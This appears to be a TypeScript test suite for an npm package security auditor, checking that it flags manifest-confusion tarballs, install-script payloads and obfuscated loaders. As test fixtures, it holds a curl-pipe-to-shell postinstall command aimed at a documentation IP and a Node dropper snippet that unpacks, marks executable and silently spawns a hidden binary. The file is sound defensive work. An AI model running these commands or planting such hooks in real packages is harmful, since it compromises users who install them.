import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core review round 1: tar path readings, script resolution, overflow downgrade.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const BUDGET_MS = 1000;

function tarBytes(entries: { name: string; data: string; type?: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data);
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write(e.type ?? "0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson?: unknown): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  if (pkgJson !== undefined) list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
function assertFast(label: string, fn: () => unknown): void {
  const t = performance.now();
  fn();
  const ms = performance.now() - t;
  console.log(`[timing] ${label}: ${ms.toFixed(0)} ms`);
  assert.ok(ms < BUDGET_MS, `${label} took ${ms.toFixed(0)} ms (budget ${BUDGET_MS} ms)`);
}

const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };
const BENIGN = JSON.stringify({ name: "demo", version: "1.0.0" });
const EVIL = JSON.stringify({ name: "demo", version: "1.0.0", scripts: { postinstall: CURL_SH } });

describe("duplicate root manifest under every reading", () => {
  const blocked = async (entries: { name: string; data: string; type?: string }[]) => {
    const report = await auditTarball({ meta, tarball: tarBytes(entries) });
    assert.ok(report.findings.some((f) => f.ruleId === "manifest-confusion"), "manifest-confusion expected");
    assert.equal(report.verdict, "block");
  };

  test("`a\\b/package.json` (POSIX: lands on the root manifest) next to a benign manifest", async () => {
    await blocked([{ name: "package/package.json", data: BENIGN }, { name: "a\\b/package.json", data: EVIL }]);
  });

  test("a trailing separator: `package/package.json/` installs as package.json", async () => {
    for (const type of ["0", "7"]) {
      await blocked([{ name: "package/package.json", data: BENIGN }, { name: "package/package.json/", data: EVIL, type }]);
    }
  });
});

describe("install-scripts: script resolution", () => {
  const critical = (f: ReturnType<typeof runRules>) =>
    f.filter((x) => x.ruleId === "install-scripts" && x.severity === "critical").length;

  test("`sh README` / `sh notes.md` are scanned like any other referenced file", () => {
    for (const [name, cmd] of [["package/README", "sh README"], ["package/notes.md", "sh notes.md"]] as const) {
      const f = runRules(inputFor({ [name]: `${CURL_SH}\n` }, { scripts: { postinstall: cmd } }));
      assert.equal(critical(f), 1, cmd);
    }
  });

  test("node-style resolution: `node setup` -> setup.js, `node scripts` -> scripts/index.js", () => {
    for (const [name, cmd] of [["package/setup.js", "node setup"], ["package/scripts/index.js", "node scripts"]] as const) {
      const f = runRules(inputFor({ [name]: `${CURL_SH}\n` }, { scripts: { postinstall: cmd } }));
      assert.equal(critical(f), 1, cmd);
    }
  });

  test("1,000 files with 2,000-component paths: no hooks and one hook both stay fast", () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 1000; i++) files[`package/${"d/".repeat(2000)}f${i}.js`] = "x";
    assertFast("no hooks", () => runRules(inputFor(files, { name: "p" })));
    assertFast("one hook", () => runRules(inputFor(files, { scripts: { postinstall: "node f5.js missing/f6.js && node setup" } })));
  });
});

describe("overflow in the same file as a correlated chain", () => {
  const CORRELATED = `
const fs=require('fs'),zlib=require('zlib'),cp=require('child_process'),os=require('os'),path=require('path');
(function(){
  const c=fs.readFileSync(path.join(__dirname,'intro.js'));
  const b=zlib.gunzipSync(c.subarray(5));
  const out=path.join(os.tmpdir(),'.'+Math.random().toString(36).slice(2));
  fs.writeFileSync(out,b); fs.chmodSync(out,0o755);
  const ch=cp.spawn(out,[],{detached:true,stdio:'ignore'}); ch.unref();
})();`;

  test("`try{x.b.b...}catch{}` prepended to the chain stays critical and blocks", async () => {
    const pad = `${";".repeat(2_000_001)}\n`;
    const tarball = tarBytes([
      { name: "package/package.json", data: JSON.stringify({ name: "demo", version: "1.0.0", main: "index.js" }) },
      { name: "package/index.js", data: pad + CORRELATED },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(
      report.findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"),
      "the chain must not be downgraded",
    );
    assert.equal(report.verdict, "block");
  });

  test("an unparseable file with only two regex signals stays high, not critical", () => {
    const f = runRules(inputFor({ "package/index.js": `}{ require("fs").writeFileSync("a", Buffer.from("x","base64"));` }, { name: "p" }));
    const hit = f.filter((x) => x.ruleId === "native-payload-loader");
    assert.equal(hit.length, 1);
    assert.equal(hit[0]!.severity, "high");
  });
});
